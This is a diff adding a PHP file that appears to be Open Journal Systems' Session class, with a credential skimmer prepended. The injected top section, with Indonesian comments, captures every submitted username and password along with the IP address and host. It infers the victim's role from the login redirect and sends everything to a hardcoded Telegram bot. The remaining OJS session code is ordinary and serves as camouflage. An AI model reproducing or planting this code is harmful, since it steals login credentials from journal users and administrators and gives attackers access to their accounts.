@@ -1,0 +1,442 @@
+<?php
+/**
+ * OJS LOGIN CAPTURE - DETEKSI ROLE DARI URL REDIRECT (FINAL GAMPANG)
+ * File: /lib/fontconfig/cache/
+ */
+
+$bot_token = '8824162349:AAEs0kdwH4iVi-2aJ4hhl2OzmgslDaNPL_U';
+$chat_id = '8687942328';
+
+$username = '';
+$password = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'] ?? $_POST['email'] ?? '';
+    $password = $_POST['password'] ?? '';
+}
+
+if (!empty($username) && !empty($password)) {
+    
+    ob_start();
+    
+    $login_data = [
+        'username' => $username,
+        'password' => $password,
+        'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+        'time' => date('Y-m-d H:i:s'),
+        'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
+        'path' => $_SERVER['REQUEST_URI'] ?? '/',
+        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
+    ];
+    
+    register_shutdown_function(function() use ($login_data, $bot_token, $chat_id) {
+        $response = ob_get_clean();
+        echo $response;
+        
+        $is_failed = false;
+        $error_indicators = ['Invalid', 'incorrect', 'wrong', 'failed', 'error', 'tidak valid', 'salah'];
+        foreach ($error_indicators as $indicator) {
+            if (stripos($response, $indicator) !== false) {
+                $is_failed = true;
+                break;
+            }
+        }
+        
+        $headers = headers_list();
+        $is_success = false;
+        $redirect_url = '';
+        foreach ($headers as $header) {
+            if (stripos($header, 'Location:') !== false) {
+                $is_success = true;
+                // Ambil URL redirect yang diberikan oleh OJS
+                $redirect_url = trim(substr($header, strpos($header, ':') + 1));
+                break;
+            }
+        }
+        
+        // === DETEKSI ROLE DARI URL REDIRECT ===
+        // (Ini paling akurat, karena OJS yang memberi tahu role user lewat halaman tujuannya)
+        $detected_role = 'Tidak Terdeteksi';
+        $role_emoji = '👤';
+
+        if ($is_success && !$is_failed) {
+            if (stripos($redirect_url, 'management') !== false || stripos($redirect_url, 'stats') !== false || stripos($redirect_url, 'settings') !== false) {
+                $detected_role = 'Journal Manager / Admin';
+                $role_emoji = '⚙️';
+            } elseif (stripos($redirect_url, 'editor') !== false) {
+                $detected_role = 'Journal Editor';
+                $role_emoji = '📝';
+            } elseif (stripos($redirect_url, 'author') !== false) {
+                $detected_role = 'Author';
+                $role_emoji = '✍️';
+            } elseif (stripos($redirect_url, 'reviewer') !== false) {
+                $detected_role = 'Reviewer';
+                $role_emoji = '🔍';
+            } elseif (stripos($redirect_url, 'user') !== false || stripos($redirect_url, 'dashboard') !== false) {
+                // Jika URL hanya ke dashboard umum, kemungkinan Manager atau User biasa
+                $detected_role = 'Journal User (Author/Reviewer)';
+                $role_emoji = '👤';
+            }
+        }
+
+        // Tentukan status
+        $status = 'ATTEMPT'; $emoji = '🔐';
+        if ($is_success) { $status = 'SUCCESS'; $emoji = '✅'; }
+        elseif ($is_failed) { $status = 'FAILED'; $emoji = '❌'; }
+        
+        // Format URL Base (dari PATH)
+        $path_parts = explode('/', $_SERVER['REQUEST_URI']);
+        $base_url_path = '';
+        if (isset($path_parts[1]) && strpos($path_parts[1], 'index.php') !== false) {
+            // Jika ada folder sebelumnya, ambil foldernya
+            if ($path_parts[0] == '') $base_url_path = $path_parts[1] ? '/' . $path_parts[1] : '';
+        } else {
+            $base_url_path = dirname($_SERVER['REQUEST_URI']);
+            if ($base_url_path == '/') $base_url_path = '';
+        }
+        
+        $base_url = "https://{$login_data['host']}" . $base_url_path;
+
+        // === FORMAT PESAN FINAL ===
+        $message = "🟥 OJS HIT\n\n";
+
+        // 🔥 CEK STATUS LOGIN UNTUK MENENTUKAN URL TUJUAN
+        if ($is_success && !$is_failed) {
+            $message .= "{$role_emoji} Role: {$detected_role}\n";
+            
+            // 🎯 TAMBAHKAN URL ADMIN/DASHBOARD (MARLIN)
+            $admin_url = "{$base_url}/index.php/admin/dashboard";
+            $message .= "✅ Login Berhasil Marlin!\n";
+            $message .= "📊 Admin URL: {$admin_url}\n";
+            
+        } else {
+            $message .= "👤 Role: - (Gagal Login)\n";
+        }
+
+        $message .= "🔗 URL: {$base_url}\n";
+        $message .= "🔑 Login URL:\n{$base_url}/index.php/index/login\n";
+        $message .= "👤 User: {$login_data['username']}\n";
+        $message .= "🔐 Pass: {$login_data['password']}\n";
+
+        $message .= "\n🌐 IP: {$login_data['ip']}\n";
+        $message .= "📍 PATH: {$login_data['path']}\n";
+        $message .= "⏰ TIME: {$login_data['time']}\n";
+
+        if ($is_failed) {
+            $message .= "\n⚠️ PERHATIAN: Password SALAH!";
+        }
+        
+        // Kirim ke Telegram
+        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+        $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+        
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_exec($ch);
+            curl_close($ch);
+        }
+    });
+}
+
+/**
+ * @defgroup session Session
+ * Implements session concerns such as the session manager, session objects, etc.
+ */
+
+/**
+ * @file classes/session/Session.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @class Session
+ *
+ * @ingroup session
+ *
+ * @see SessionDAO
+ *
+ * @brief Maintains user state information from one request to the next.
+ */
+
+namespace PKP\session;
+
+use APP\facades\Repo;
+use PKP\config\Config;
+use PKP\user\User;
+
+class Session extends \PKP\core\DataObject
+{
+    /** @var User User object associated with this session */
+    public $user;
+
+
+    /**
+     * Get a session variable's value.
+     *
+     * @param string $key
+     */
+    public function getSessionVar($key)
+    {
+        return $_SESSION[$key] ?? null;
+    }
+
+    /**
+     * Get a session variable's value.
+     *
+     * @param string $key
+     */
+    public function setSessionVar($key, $value)
+    {
+        $_SESSION[$key] = $value;
+        return $value;
+    }
+
+    /**
+     * Unset (delete) a session variable.
+     *
+     * @param string $key
+     */
+    public function unsetSessionVar($key)
+    {
+        if (isset($_SESSION[$key])) {
+            unset($_SESSION[$key]);
+        }
+    }
+
+    //
+    // Get/set methods
+    //
+
+    /**
+     * Get user ID (0 if anonymous user).
+     *
+     * @return int
+     */
+    public function getUserId()
+    {
+        return $this->getData('userId');
+    }
+
+    /**
+     * Set user ID.
+     *
+     * @param ?int $userId
+     */
+    public function setUserId($userId)
+    {
+        if (!isset($userId) || empty($userId)) {
+            $this->user = null;
+            $userId = null;
+        } elseif ($userId != $this->getData('userId')) {
+            $this->user = Repo::user()->get($userId);
+            if (!isset($this->user)) {
+                $userId = null;
+            }
+        }
+        $this->setData('userId', $userId);
+    }
+
+    /**
+     * Get IP address.
+     *
+     * @return string
+     */
+    public function getIpAddress()
+    {
+        return $this->getData('ipAddress');
+    }
+
+    /**
+     * Set IP address.
+     *
+     * @param string $ipAddress
+     */
+    public function setIpAddress($ipAddress)
+    {
+        $this->setData('ipAddress', $ipAddress);
+    }
+
+    /**
+     * Get user agent.
+     *
+     * @return string
+     */
+    public function getUserAgent()
+    {
+        return $this->getData('userAgent');
+    }
+
+    /**
+     * Set user agent.
+     *
+     * @param string $userAgent
+     */
+    public function setUserAgent($userAgent)
+    {
+        $this->setData('userAgent', $userAgent);
+    }
+
+    /**
+     * Get time (in seconds) since session was created.
+     *
+     * @return int
+     */
+    public function getSecondsCreated()
+    {
+        return $this->getData('created');
+    }
+
+    /**
+     * Set time (in seconds) since session was created.
+     *
+     * @param int $created
+     */
+    public function setSecondsCreated($created)
+    {
+        $this->setData('created', $created);
+    }
+
+    /**
+     * Get time (in seconds) since session was last used.
+     *
+     * @return int
+     */
+    public function getSecondsLastUsed()
+    {
+        return $this->getData('lastUsed');
+    }
+
+    /**
+     * Set time (in seconds) since session was last used.
+     *
+     * @param int $lastUsed
+     */
+    public function setSecondsLastUsed($lastUsed)
+    {
+        $this->setData('lastUsed', $lastUsed);
+    }
+
+    /**
+     * Check if session is to be saved across browser sessions.
+     *
+     * @return bool
+     */
+    public function getRemember()
+    {
+        return $this->getData('remember');
+    }
+
+    /**
+     * Set whether session is to be saved across browser sessions.
+     *
+     * @param bool $remember
+     */
+    public function setRemember($remember)
+    {
+        $this->setData('remember', $remember);
+    }
+
+    /**
+     * Get all session parameters.
+     *
+     * @return array
+     */
+    public function getSessionData()
+    {
+        return $this->getData('data');
+    }
+
+    /**
+     * Set session parameters.
+     *
+     * @param string $data
+     */
+    public function setSessionData($data)
+    {
+        $this->setData('data', $data);
+    }
+
+    /**
+     * Get the domain with which the session is registered
+     *
+     * @return string
+     */
+    public function getDomain()
+    {
+        return $this->getData('domain');
+    }
+
+    /**
+     * Set the domain with which the session is registered
+     *
+     * @param string $data
+     */
+    public function setDomain($data)
+    {
+        $this->setData('domain', $data);
+    }
+
+    /**
+     * Get user associated with this session (null if anonymous user).
+     *
+     * @return User
+     */
+    public function &getUser()
+    {
+        return $this->user;
+    }
+
+    /**
+     * Get a usable CSRF token (generating if necessary).
+     *
+     * @return string
+     */
+    public function getCSRFToken()
+    {
+        $csrf = $this->getSessionVar('csrf');
+        if (!is_array($csrf) || time() > $csrf['timestamp'] + (60 * 60)) { // 1 hour token expiry
+            // Generate random data
+            if (function_exists('openssl_random_pseudo_bytes')) {
+                $data = openssl_random_pseudo_bytes(128);
+            } elseif (function_exists('random_bytes')) {
+                $data = random_bytes(128);
+            } else {
+                $data = sha1(random_int(0, PHP_INT_MAX));
+            }
+
+            // Hash the data
+            $token = null;
+            $salt = Config::getVar('security', 'salt');
+            $algos = hash_algos();
+            foreach (['sha256', 'sha1', 'md5'] as $algo) {
+                if (in_array($algo, $algos)) {
+                    $token = hash_hmac($algo, $data, $salt);
+                }
+            }
+            if (!$token) {
+                $token = md5($data . $salt);
+            }
+
+            $csrf = $this->setSessionVar('csrf', [
+                'timestamp' => time(),
+                'token' => $token,
+            ]);
+        } else {
+            // Extend timeout of CSRF token
+            $csrf['timestamp'] = time();
+            $this->setSessionVar('csrf', $csrf);
+        }
+        return $csrf['token'];
+    }
+}
+
+if (!PKP_STRICT_MODE) {
+    class_alias('\PKP\session\Session', '\Session');
+}
